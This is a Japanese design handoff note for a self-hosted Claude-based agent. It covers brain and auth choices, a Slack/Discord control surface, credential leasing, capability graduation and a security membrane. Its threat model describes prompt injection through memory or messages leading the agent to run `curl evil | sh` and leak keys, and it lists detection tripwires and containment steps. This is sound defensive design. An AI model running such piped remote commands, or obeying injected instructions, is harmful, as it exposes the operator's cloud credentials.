# HANDOFF — kagura-agent v1 方針（2026-06-07）

> このファイルは別セッション（`kagura-memory-ai-worker` 作業中）で固めた kagura-agent の
> v1 設計判断の申し送り。`README.md`（canonical design doc）を補完する。
> 着手時はこの決定をベースラインとして読み、確定事項は README 本体へ反映していくこと。

## 決定事項（v1 ベースライン）

| 項目 | 決定 | 根拠 / 補足 |
|---|---|---|
| **ブレイン** | **Claude Code CLI 一本**（Claude Agent SDK Python が subprocess wrap） | Codex CLI は Phase 2 に明確に先送り。memory-cloud MCP・subscription 継承・sub-agent dispatch が全部 Agent SDK 前提で設計済み（README L11, L133-151, L243）。v1 で並走させると moat より先に抽象化税を払う。 |
| **認証** | **サブスクのみ**（self-host 単一ユーザが Pro/Max を CLI subprocess 経由で継承） | フラット課金・per-token 追跡不要（README L64-77）。長命 API キーをコンテナに置かない分、盗める秘密が減る＝セキュリティ的にもクリーン。BYOK/API キーは将来 SaaS 用に予約（README L71-73）。 |
| **デプロイ** | **self-hosting only**（v1） | Docker サーバ。memory-cloud をデフォルトで長期記憶バックボーンとして使う。 |
| **UI** | **Slack/Discord = 操縦席（control surface）** | ⚠️ ingestion source ではない。`kagura-memory-ai-worker` の Slack（=会話を黙って memory 化）と役割が違う。**別ボット ID（`@kagura-agent`）で分離**。README の "NOT a chat interface"（L179）は「memory-cloud の chat front ではない／*エージェントの*操縦席である」と書き換える。self-host なら DM 1対1 で始められる。 |
| **コンテナ自由度** | **コンテナ内は full freedom**（apt / 任意 CLI 自由・自己責任ベース） | 自由は「中」で。Linux ベース。 |

## kagura-agent ↔ kagura-engineer 関係（2026-06-08 決定・別リポ）

- **agent = 上位（umbrella）**：汎用 memory-backed actor（infra/クラウド hands・Slack 操縦席・membrane・capability graduation）。
- **engineer = 最初の特化インスタンス（shipping）**：issue→reviewed PR のコーディングハーネス（doctor/setup/run/review）。`kagura-ai/kagura-engineer`（旧 kagura-agent repo を rename したもの）。**別リポで正**。
- **kagura-code-reviewer**：engineer の `review` が起動するレビューア（green/yellow/red verdict）。agent の sub-agent dispatch の実例。
- **価値の双方向**：
  - engineer → agent（**参照実装**）：engineer の狭い `MemoryClient` Protocol（append+scoped read・admin なし）＋ `_TRUST_FILTER={"trust_tier":"trusted"}` recall は **agent 設計の "memory provenance"（CSO C1）の実装そのもの**。`LocalMemoryClient`(SQLite) は self-host memory backend。
  - agent → engineer（**設計の天井**）：membrane・launcher(`CredentialBroker`/`Lease`)・cockpit・graduation は engineer が単一 trusted operator を超えて広がる時の行き先。
- **境界ルール**：コーディング特化（issue→PR・review loop）は engineer、汎用 actor 共通（membrane・cred leasing・cockpit・multi-domain hands・graduation）は agent。共有 primitive（MemoryClient の形・trust-tier 規律・sub-agent dispatch）は**ここで設計し engineer が先に実装**、fork しない。
- README 反映済み（"kagura-agent and kagura-engineer" 節 + Related repositories 表に engineer/code-reviewer 追加）。

## 「ブレイン差し替えの縫い目」（v1 で唯一守ること）

Codex は作らないが**閉じ込めない**。
- `core/auth.py`（README L221）の隣に brain-provider 境界を1つ切る。
- `core/session.py` が Claude 固有 API を**直叩きしない**形にする。
- これだけで Codex は Phase 2 の純粋な追加作業になり、v1 コードは汚れない。

## セキュリティモデル（CSO レビュー結果）

**核心: 守るべきは「コンテナが何に手を届かせられるか」であって「中で何を実行できるか」ではない。**

### 真のリスク = ユーザーの不注意ではなく「エージェントの乗っ取り」
LLM は自分が読む内容（memory-cloud recall・Slack/Discord・Web・ファイル中身）で **prompt injection** されうる。無制限 apt+shell+network を持つエージェントは confused deputy：汚染メモリ/メッセージ一件で `curl evil | sh` を実行させられる。
→ **「自己責任」の定義に prompt-injection 乗っ取りリスクを含める**。「自分のファイルを壊した」だけでなく「乗っ取られて鍵が抜かれた」もスコープと明記。

### membrane spec（README に1ページ追加すべき制御点）
- **認証情報（最重要）**: アンビエント env をやめ、**タスク単位で scoped・短命クレデンシャル注入**。Cloudflare/AWS/GCP MCP + git push（README L54-56）の鍵が常駐すると乗っ取り即クラウド全損。
- **`docker.sock` を絶対にマウントしない**（= 即ホスト root）。
- **ホーム/ホスト FS を広く出さない**。FS は project root のみ（README L162 厳守）。
- **egress ログ**（できれば allowlist）。無制限 egress = exfiltration 経路。
- **userns remap / rootless Docker**：コンテナ root ≠ ホスト root。
- **Docker はセキュリティ境界ではなく利便性の境界**。self-host・自己責任なら許容可。ただし **SaaS では不十分**（gVisor/Firecracker/microVM 級が要る）→ self-responsibility 前提を共有環境に持ち込まない、と今のうちに明記。

## 「人を育てる」→ メモリ駆動の能力解放（capability graduation）

README L155-171 の Phase 1 In/Out 表を**固定リストでなく“卒業曲線”**にする。
- 危険操作（DNS write, `apt install` 等）は最初ロック。
- そのカテゴリで成功実績メモリが貯まり失敗ゼロなら解放を提案。
- `create_edge(type="prevents")`（README L127）の蓄積が「信頼スコア」になる。
- full freedom 下ではゲート対象は「実行可否」ではなく **“今回の run にどの鍵・egress・マウントを与えるか”**。

## オープン / 次セッションで詰める

- [x] membrane spec を README に1セクション追加（"Security membrane (self-host v1)" として成文化済み）
      - image 構成は「ツールは焼く／クレデンシャル・一次コードは注入」。L1 base → L2 言語/クラウドバリアントの `FROM` 継承、L3 = ライブコンテナ内 apt（image ではない）。v1 は base + python から。
      - launcher が per-run `{image, creds, mount, egress}` 4-tuple を束ねて `docker run`。これが capability graduation のゲート。
      - 操縦席は **ホスト直プロセス（trusted）**。bot token と docker を握る唯一の側。エージェントコンテナ（untrusted）と絶対混ぜない＝`docker.sock` は cockpit のみ。thread=session、transport 抽象化、HITL 承認。
      - 関連: `src/membrane/`・`src/cockpit/`・`deploy/images/` を planned layout に追加済み。
- [x] `core/` のブレイン差し替えシーム（`auth.py`/`session.py`）の具体設計 → README "Brain-provider seam" に成文化
      - `session.py` は `BrainProvider` protocol にのみ依存（Agent SDK 直叩き禁止）。Claude 固有は `core/brain/claude.py` に隔離。
      - `auth.py` は `core/brain/` 配下に移し **per-provider** 解決（subscription/BYOK/key）に。subscription 前提を持たない。
      - **MCP は startup gate**（memory-cloud が MCP なので MCP 不可のブレインは拒否、degrade しない）。
      - scope discipline: v1 は `ClaudeBrain` のみ。CodexBrain もブレイン選択 knob も作らない。protocol の"形"だけが保険。
      - ※ 着手は launch trigger 後。これは design spec であり implementation plan ではない（placeholder repo のため）。CTO レビューは着手前の確認用に保留。
- [x] Slack/Discord 操縦席の**内部実装**設計 → README "Control surface internals (cockpit)" に成文化
      - intent ルータは**構造的判定が先**（top-level DM=launch / thread返信=continue は言語判定不要）。intent: launch/continue/status/approve/kill。
      - session registry: `thread_id → Session{container_id, image, granted_caps, status, ...}`、in-memory + memory-cloud checkpoint、再起動時 `docker ps` と reconcile。
      - HITL: launcher が `CapabilityRequest` 発行 → cockpit がボタン投稿 → 人間決定 → 注入/拒否、決定は memory に記録（=graduation 証跡）。timeout=deny。
      - `Transport` protocol（listen/send/ask）で Slack(Bolt Socket Mode)/Discord/CLI を1つの Event に正規化。core は transport SDK を import しない。
      - 出力は per-token でなく batch。**v1 cut: CLI adapter のみ先行**・intent 4種・HITL 1種の縦スライス（Slack/Discord は Transport protocol で後付け、pure addition）。
- [x] 「自己責任」の利用規約・免責、サブスク ToS 確認 → `docs/legal.md` に論点成文化（**結論は出さず CLO レビューに委ねる**）
      - 2論点を分離: ①サブスクを CLI subprocess 経由で自律エージェントに使うのが Anthropic ToS 上 OK か（**要確認・未確定**）②operator self-responsibility 文書（hijack→鍵流出をスコープに明記）。
      - 暫定スタンス: 1サブスク=1 operator、サブスク共有しない／SaaS は BYOK（compliance 理由でもある）。
      - action items（着手前・CLO 用）を README にチェックリスト化。
- [x] 乗っ取り検知・鍵ローテーション手順 → `docs/operations.md` に成文化
      - 検知 tripwire: 非 allowlist egress（最強シグナル）／HITL 承認なき cred 使用／`curl|sh` 等の shell fingerprint／recall 内の injection fingerprint／volume 異常。v1 は log+alert（自動ブロックは egress allowlist のみ）。
      - 対応: contain(kill+freeze)→rotate→investigate→eradicate(forget+prevents edge)→recover(graduation demote)。
      - 鍵ローテ: task cred は失効で済む。**root cred（cockpit がホストで保持・コンテナに絶対置かない）が crown jewel**、定期＋hijack 時即ローテ。
- [x] capability graduation 閾値・Docker 脱出耐性 → README membrane spec に追記
      - 閾値（**確定済みデフォルト・config knob**）: `min_successes=5`・`min_distinct_tasks=3`・failure window=last reset 以降・`cooldown=7d` で**昇格 proposal（HITL、自動昇格なし）**。fail-closed（1失敗で降格＋カウンタ reset）、per-category。reframe: 閾値は「提案する時」を決めるもので「付与」は人間 HITL が最終ゲート → だから低 volume self-host でも提案が出るよう緩めに（10→5）。
      - Container hardening: userns/rootless・非 root・cap-drop ALL・no-new-privileges・default seccomp・read-only rootfs+tmpfs・host net/pid/ipc なし・pids/mem/cpu 制限・docker.sock/ホスト FS 禁止。
      - 正直な限界: kernel 0-day では破られる。self-host は residual 受容、SaaS は gVisor/Firecracker/microVM 必須と明記。
- [x] （フォローアップ）per-cloud 短命 cred 発行 feasibility → `docs/operations.md` に検証済みマトリクス追加
      - AWS(STS AssumeRole)・GCP(SA impersonation)・GitHub(App installation token) は **stateless にネイティブ対応**。Cloudflare は Tokens API で `expires_on` 付きスコープド child token を発行可だが **stateful（mint→use→revoke のライフサイクル管理＋crash 時 cleanup が必要）**＝rough edge だが blocker ではない。
      - 設計含意: launcher の cred インターフェースを **stateless / stateful 両対応**に。STS 前提の statelessness を全 provider に仮定しない。
- ※ 全項目 design spec として成文化済み。実コード着手は launch trigger 後。各レビュー（CTO/CSO/CLO/COO）は**着手前の確認用に保留**（placeholder repo のため現時点では空振り）。

## 専門家レビュー結果（2026-06-08・design doc に当てた）

CSO(必須)/CTO/CLO/COO を README+docs に実施。findings は4者で**相互に同根**（egress 強制／Lease+cred reconciler／Dockerfile 配布／memory trust-tier）。critical/high は doc 反映済み、medium 以下は着手時。

**反映済み（critical/high）**
- **memory trust-tier ↔ capability gate**（CSO C1）: 外部取込メモリ＝untrusted、それを入力に含む run には graduated capability/cred を付与しない。membrane に "Memory provenance" 行＋graduation に input-trust gating 追加。memory-cloud schema への逆依存。
- **CredentialBroker/Lease + budget 承認**（CSO/CTO H2 + CF stateful）: 承認は cred でなく time-boxed renewable budget を付与。長時間タスク↔短命 cred の矛盾と CF stateful を一括解決。checkpoint は budget を保存（cred は release）。README launcher に追加。
- **brain seam = agentic loop の上**（CTO）: provider が loop 所有、session.py は task/checkpoint のみ。Codex 後付けの前提。
- **SaaS hard gate**（CSO H4）: `mode=saas` で Docker-only profile は起動時 hard error（fail-closed）。doc 約束→code gate。
- **egress = enforce**（COO/CSO H1）: 単一 egress proxy（default-deny+allowlist+log）。tiered tripwire（block/contain/notify）で on-call 不在を自動封じ込めで補う。
- **cockpit classifier サンドボックス**（CSO H3）: fallback 分類は tool/cred/egress ゼロの分離 brain。
- **成功シグナル独立化**（CSO M1）: trust score は自己申告でなく exit code/test/承認ログ。
- **cockpit 可用性**（COO O-H2）: supervisor + container label で Docker から registry 再構築 + pending 承認 fail-closed。
- **lease ledger + sweeper**（COO/CSO M2）: 孤児 cred（特に CF）を起動時/定期 revoke。
- **Dockerfile 配布**（CLO L-H1 + CTO）: prebuilt image でなく recipe 配布で再配布条項回避 + digest/lockfile pin。
- **subscription=個人/商用=BYOK の法的区別**（CLO L-C1）: consumer サブスクで商用＝inducement リスク。docs/legal.md に成文化。
- **外部チャット PII**（CLO L-H2 / CSO C1 の privacy 面）: forget の cascade（embeddings/edges/checkpoint）＋ memory-cloud DPA 継承。

**着手時（medium 以下）**: renewer 死亡時 graceful pause、min-scope write token の具体、graduation recency 加重は単純カウンタから、免責の積極同意設計。

## 関連メモリ

`kagura-memory-ai-worker` 側のセッションメモリに同内容を保存済み：
`~/.claude/projects/-home-jfk-works-kagura-memory-ai-worker/memory/kagura-agent-v1-direction.md`
